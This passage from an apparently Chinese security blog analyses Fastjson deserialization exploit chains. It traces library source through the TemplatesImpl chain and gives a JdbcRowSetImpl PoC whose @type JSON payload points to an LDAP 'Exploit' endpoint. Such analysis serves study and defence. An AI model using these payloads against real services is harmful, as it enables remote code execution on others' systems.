<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">parseObject</span><span class="params">(String input, Type clazz, ParserConfig config, ParseProcess processor, <span class="keyword">int</span> featureValues, Feature... features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (features != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Feature[] var6 = features;</span><br><span class="line">                <span class="keyword">int</span> var7 = features.length;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> var8 = <span class="number">0</span>; var8 &lt; var7; ++var8) &#123;</span><br><span class="line">                    Feature feature = var6[var8];</span><br><span class="line">                    featureValues |= feature.mask;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            DefaultJSONParser parser = <span class="keyword">new</span> DefaultJSONParser(input, config, featureValues);</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">            T value = parser.parseObject(clazz, (Object)<span class="keyword">null</span>);</span><br><span class="line">            parser.handleResovleTask(value);</span><br><span class="line">            parser.close();</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>先通过传进去的feature也就是我们设置的Feature.SupportNonPublicFields生成FeatureValues并作为参数传入DefaultJSONParser类中初始化生成一个parser，然后调用parser中的parserObject来解析clazz。</p>
<p>DefaultJSONParser#parseObject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">parseObject</span><span class="params">(Type type, Object fieldName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> token = <span class="keyword">this</span>.lexer.token(); <span class="comment">//token=12</span></span><br><span class="line">    <span class="keyword">if</span> (token == <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.lexer.nextToken();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (token == <span class="number">4</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span> (type == <span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.lexer.bytesValue();</span><br><span class="line">                <span class="keyword">this</span>.lexer.nextToken();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (type == <span class="keyword">char</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                String strVal = <span class="keyword">this</span>.lexer.stringVal();</span><br><span class="line">                <span class="keyword">this</span>.lexer.nextToken();</span><br><span class="line">                <span class="keyword">return</span> strVal.toCharArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ObjectDeserializer derializer = <span class="keyword">this</span>.config.getDeserializer(type);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> derializer.deserialze(<span class="keyword">this</span>, type, fieldName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JSONException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var6;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(var7.getMessage(), var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过getDeserializer函数或者对应类型的反序列化器，并进行反序列化</p>
<p>JavaObjectDeserializer#deserialze</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (type <span class="keyword">instanceof</span> GenericArrayType) &#123;</span><br><span class="line">            Type componentType = ((GenericArrayType)type).getGenericComponentType();</span><br><span class="line">            <span class="keyword">if</span> (componentType <span class="keyword">instanceof</span> TypeVariable) &#123;</span><br><span class="line">                TypeVariable&lt;?&gt; componentVar = (TypeVariable)componentType;</span><br><span class="line">                componentType = componentVar.getBounds()[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            List&lt;Object&gt; list = <span class="keyword">new</span> ArrayList();</span><br><span class="line">            parser.parseArray(componentType, list);</span><br><span class="line">            <span class="keyword">if</span> (componentType <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                Class&lt;?&gt; componentClass = (Class)componentType;</span><br><span class="line">                Object[] array = (Object[])((Object[])Array.newInstance(componentClass, list.size()));</span><br><span class="line">                list.toArray(array);</span><br><span class="line">                <span class="keyword">return</span> array;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> list.toArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">➡️            return type instanceof Class &amp;&amp; type != Object.class &amp;&amp; type != Serializable.class ? parser.parseObject(type) : parser.parse(fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>由于type为Object.class类型，所以进入parse函数</p>
<p>DefaultJSONParser#parse</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">parse</span><span class="params">(Object fieldName)</span> </span>&#123;</span><br><span class="line">    JSONLexer lexer = <span class="keyword">this</span>.lexer;</span><br><span class="line">    <span class="keyword">switch</span>(lexer.token()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">  JSONObject object = <span class="keyword">new</span> JSONObject(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.parseObject((Map)object, fieldName);</span><br></pre></td></tr></table></figure>

<p>在Feature.OrderField选项关闭的情况下进入一个新的parseObject函数(返回类型为Object)</p>
<p>DefaultJSONParser#parseObject(return Object)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">parseObject</span><span class="params">(Map object, Object fieldName)</span> </span>&#123;</span><br><span class="line">    JSONLexer lexer = <span class="keyword">this</span>.lexer;            </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">boolean</span> setContextFlag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                lexer.skipWhitespace();</span><br><span class="line">                <span class="keyword">char</span> ch = lexer.getCurrent();</span><br><span class="line">                <span class="keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">                    <span class="keyword">while</span>(ch == <span class="string">','</span>) &#123;</span><br><span class="line">                        lexer.next();</span><br><span class="line">                        lexer.skipWhitespace();</span><br><span class="line">                        ch = lexer.getCurrent();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">boolean</span> isObjectKey = <span class="keyword">false</span>;</span><br><span class="line">                Object key;</span><br><span class="line">                ParseContext contextR;</span><br><span class="line">                <span class="keyword">if</span> (ch == <span class="string">'"'</span>) &#123;</span><br><span class="line">                    key = lexer.scanSymbol(<span class="keyword">this</span>.symbolTable, <span class="string">'"'</span>);</span><br><span class="line">                    lexer.skipWhitespace();</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"expect ':' at "</span> + lexer.pos() + <span class="string">", name "</span> + key);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>进行json内容解析扫描，通过skipWhitespace函数进行空格去除，然后拿到当前字符，如果是双引号的，再次通过scanSymbol函数进行解析扫描</p>
<p><img src="https://s1.ax1x.com/2020/09/22/wX01Wn.png" alt="wX01Wn.png"></p>
<p>在扫描到双引号的情况下停止并返回</p>
<p><img src="https://s1.ax1x.com/2020/09/22/wX01Wn.png" alt="wX01Wn.png"></p>
<p>所以我们此时得到了value为@type的key变量，再接着向下跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    ref = lexer.scanSymbol(<span class="keyword">this</span>.symbolTable, <span class="string">'"'</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="keyword">this</span>.config.getDefaultClassLoader());</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        lexer.nextToken(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> (lexer.token() != <span class="number">13</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.setResolveStatus(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.context != <span class="keyword">null</span> &amp;&amp; !(fieldName <span class="keyword">instanceof</span> Integer)) &#123;</span><br><span class="line">                <span class="keyword">this</span>.popContext();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (object.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                instance = TypeUtils.cast(object, clazz, <span class="keyword">this</span>.config);</span><br><span class="line">                <span class="keyword">this</span>.parseObject(instance);</span><br><span class="line">                thisObj = instance;</span><br><span class="line">                <span class="keyword">return</span> thisObj;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line">            thisObj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">            <span class="keyword">return</span> thisObj;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>条件满足key并且DisableSpecialKeyDetect选项关闭，接着进行扫描，扫描下一个双引号中的内容，也就是com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，并且通过loadclass加载此类，跟进loadclass</p>
<p>TypeUtils#loadclass</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className != <span class="keyword">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (classLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    clazz = classLoader.loadClass(className);</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var6) &#123;</span><br><span class="line">                var6.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (contextClassLoader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var5) &#123;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>通过loadclass加载到目标类并返回，然后将className与clazz放入缓存mappings，这里做缓存可以更方便下次调用，避免重复的loadclass耗费资源</p>
<p>接着回到parseObject函数中，再次进入deserilaze函数做反序列化处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line">thisObj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line"> <span class="keyword">return</span> thisObj;</span><br></pre></td></tr></table></figure>

<p>JavaBeanDeserializer#deserialize</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName, Object object, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">                                    label1013: &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (!matchField) &#123;</span><br><span class="line">                                            key = lexer.scanSymbol(parser.symbolTable);</span><br><span class="line">                                            <span class="keyword">if</span> (key == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                                token = lexer.token();</span><br><span class="line">                                                <span class="keyword">if</span> (token == <span class="number">13</span>) &#123;</span><br><span class="line">                                                    lexer.nextToken(<span class="number">16</span>);</span><br><span class="line">                                                    <span class="keyword">break</span> label1013;</span><br><span class="line">                                                &#125;</span><br><span class="line"></span><br><span class="line">                                                <span class="keyword">if</span> (token == <span class="number">16</span> &amp;&amp; lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">                                                    <span class="keyword">break</span> label1068;</span><br><span class="line">                                                &#125;</span><br><span class="line">                                            &#125;</span><br></pre></td></tr></table></figure>

<p>通过scanSymbol再次扫描双引号，获得_bytecode恶意代码字段，并且通过parseField函数对此字段进行解析</p>
<p>JavaBeanDeserializer#parseField</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">parseField</span><span class="params">(DefaultJSONParser parser, String key, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer;</span><br><span class="line">        FieldDeserializer fieldDeserializer = <span class="keyword">this</span>.smartMatch(key);</span><br><span class="line">        <span class="keyword">int</span> mask = Feature.SupportNonPublicField.mask;</span><br><span class="line">        <span class="keyword">if</span> (fieldDeserializer == <span class="keyword">null</span> &amp;&amp; (parser.lexer.isEnabled(mask) || (<span class="keyword">this</span>.beanInfo.parserFeatures &amp; mask) != <span class="number">0</span>)) &#123;</span><br><span class="line">....</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            lexer.nextTokenWithColon(((FieldDeserializer)fieldDeserializer).getFastMatchToken());</span><br><span class="line"> ➡️           ((FieldDeserializer)fieldDeserializer).parseField(parser, object, objectType, fieldValues);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再次跟进parseField函数</p>
<p>DefaultFieldDeseriailizer#parseField</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parseField</span><span class="params">(DefaultJSONParser parser, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.fieldValueDeserilizer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.getFieldValueDeserilizer(parser.getConfig());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">        Object value;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.fieldValueDeserilizer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">            JavaBeanDeserializer javaBeanDeser = (JavaBeanDeserializer)<span class="keyword">this</span>.fieldValueDeserilizer;</span><br><span class="line">            value = javaBeanDeser.deserialze(parser, fieldType, <span class="keyword">this</span>.fieldInfo.name, <span class="keyword">this</span>.fieldInfo.parserFeatures);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.format != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.fieldValueDeserilizer <span class="keyword">instanceof</span> ContextObjectDeserializer) &#123;</span><br><span class="line">            value = ((ContextObjectDeserializer)<span class="keyword">this</span>.fieldValueDeserilizer).deserialze(parser, fieldType, <span class="keyword">this</span>.fieldInfo.name, <span class="keyword">this</span>.fieldInfo.format, <span class="keyword">this</span>.fieldInfo.parserFeatures);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            value = <span class="keyword">this</span>.fieldValueDeserilizer.deserialze(parser, fieldType, <span class="keyword">this</span>.fieldInfo.name);</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line"> ...</span><br><span class="line">   </span><br><span class="line">        <span class="keyword">if</span> (parser.getResolveStatus() == <span class="number">1</span>) &#123;</span><br><span class="line">            ResolveTask task = parser.getLastResolveTask();</span><br><span class="line">            task.fieldDeserializer = <span class="keyword">this</span>;</span><br><span class="line">            task.ownerContext = parser.getContext();</span><br><span class="line">            parser.setResolveStatus(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">            fieldValues.put(<span class="keyword">this</span>.fieldInfo.name, value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.setValue(object, value);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>最后进入关键方法FieldDeserializer#setvalue，主要代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">field.set(object, value);</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/09/23/wXcXDI.png" alt="wXcXDI.png"></p>
<p>成功将_bytecodes变量设置为恶意类，接下来_outputProperties的检测同样如此</p>
<p>通过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method method = <span class="keyword">this</span>.fieldInfo.method;</span><br></pre></td></tr></table></figure>

<p>检测出反序列化调用的getter进行反射调用getoutputProperties方法</p>
<p>跟进此方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进newTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进getTransletInstance</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">        translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进defineTransletClasses</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>

<p>在这段代码中首先要注意下_tfactory.getExternalExtensionsMap，这里也就是为什么我们要将字段中的_tfactory设置为{}的原因，防止后续产生报错</p>
<p><img src="https://s1.ax1x.com/2020/09/23/wXg7d0.png" alt="wXg7d0.png"></p>
<p>将恶意类定义，并进行了父类的判断，然后再在getTransletInstance中通过newInstance函数将恶意类实例化，触发命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure>

<p>完整调用链如下</p>
<p><img src="https://s1.ax1x.com/2020/09/23/wXgvQJ.png" alt="wXgvQJ.png"></p>
<h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><h4 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        testJdbcRowSetImpl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testJdbcRowSetImpl</span><span class="params">()</span></span>&#123;</span><br><span class="line">                String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1387/Exploit\","</span> +</span><br><span class="line">                <span class="string">" \"autoCommit\":true&#125;"</span>;</span><br><span class="line">       <span class="comment">/* String payload = "&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +</span></span><br><span class="line"><span class="comment">                " \"autoCommit\":true&#125;";*/</span></span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="调用链分析-1"><a href="#调用链分析-1" class="headerlink" title="调用链分析"></a>调用链分析</h4><p>前面一直到loadclass一直都是一样的，这里就不再赘述</p>
<p><img src="https://s1.ax1x.com/2020/09/23/wxyFmR.png" alt="wxyFmR.png"></p>
<p>反序列化解析类的过程依然是先遍历一遍属性，然后接着解析json，拿到键值</p>
<p><img src="https://s1.ax1x.com/2020/09/23/wxcMdI.png" alt="wxcMdI.png"></p>
<p>再跟进parseObject</p>
<p>JavaBeanDeserializer#parseObject</p>
<p><img src="https://s1.ax1x.com/2020/09/24/wxgpp8.png" alt="wxgpp8.png"></p>
<p>接着跟进其中的parseField方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parseField</span><span class="params">(DefaultJSONParser parser, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.fieldValueDeserilizer == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.getFieldValueDeserilizer(parser.getConfig());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Type fieldType = <span class="keyword">this</span>.fieldInfo.fieldType;</span><br><span class="line">    <span class="keyword">if</span> (objectType <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">        ParseContext objContext = parser.getContext();</span><br><span class="line">        <span class="keyword">if</span> (objContext != <span class="keyword">null</span>) &#123;</span><br><span class="line">            objContext.type = objectType;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fieldType = FieldInfo.getFieldType(<span class="keyword">this</span>.clazz, objectType, fieldType);</span><br><span class="line">        <span class="keyword">this</span>.fieldValueDeserilizer = parser.getConfig().getDeserializer(fieldType);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object value;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.fieldValueDeserilizer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">        JavaBeanDeserializer javaBeanDeser = (JavaBeanDeserializer)<span class="keyword">this</span>.fieldValueDeserilizer;</span><br><span class="line">        value = javaBeanDeser.deserialze(parser, fieldType, <span class="keyword">this</span>.fieldInfo.name, <span class="keyword">this</span>.fieldInfo.parserFeatures);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.format != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.fieldValueDeserilizer <span class="keyword">instanceof</span> ContextObjectDeserializer) &#123;</span><br><span class="line">        value = ((ContextObjectDeserializer)<span class="keyword">this</span>.fieldValueDeserilizer).deserialze(parser, fieldType, <span class="keyword">this</span>.fieldInfo.name, <span class="keyword">this</span>.fieldInfo.format, <span class="keyword">this</span>.fieldInfo.parserFeatures);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        value = <span class="keyword">this</span>.fieldValueDeserilizer.deserialze(parser, fieldType, <span class="keyword">this</span>.fieldInfo.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (parser.getResolveStatus() == <span class="number">1</span>) &#123;</span><br><span class="line">        ResolveTask task = parser.getLastResolveTask();</span><br><span class="line">        task.fieldDeserializer = <span class="keyword">this</span>;</span><br><span class="line">        task.ownerContext = parser.getContext();</span><br><span class="line">        parser.setResolveStatus(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">        fieldValues.put(<span 